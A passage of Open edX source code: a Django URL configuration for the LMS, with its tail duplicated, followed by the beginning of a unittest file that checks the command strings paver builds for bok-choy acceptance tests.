            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

"""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
"""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """
    Paver Bok Choy Command test cases
    """

    def _expected_command(self, name, store=None, verify_xss=False):                    
        """
        Returns the command that is expected to be run for the given test spec
        and store.
        """

        expected_statement = (
            "DEFAULT_STORE={default_store} "
            "SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' "
            "BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' "
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' "
            "SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' "
            "VERIFY_XSS='{verify_xss}' "
            "nosetests {repo_dir}/common/test/acceptance/{exp_text} "
            "--with-xunit "
            "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml "
            "--verbosity=2 "
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, "")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')                    
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """
        expected_verbosity_string = (
            "--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
